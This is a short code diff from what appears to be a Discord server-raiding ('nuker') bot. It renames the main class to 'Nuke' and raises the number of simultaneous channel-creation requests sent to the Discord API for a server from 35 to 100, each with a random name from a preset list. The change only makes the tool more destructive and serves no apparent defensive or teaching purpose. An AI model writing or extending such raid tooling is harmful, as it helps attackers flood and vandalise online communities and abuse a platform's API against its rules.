@@ -9,7 +9,7 @@ from core.config.config import (CHNAME,  LINKSERV, headers, NAME)
 from core.tasks import create_tasks, request
 
 
-class Fucker:
+class Nuke:
     def __init__(self, ctx):
         self.ctx = ctx
         self.headers = headers
@@ -33,7 +33,7 @@ class Fucker:
     async def crChannels(self, ctx):
         urls = [
             f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/channels"
-            for _ in range(35)
+            for _ in range(100)
         ]
         jsons = [
             {"name": random.choice(CHNAME), "topic": "", "type": 0} for _ in urls
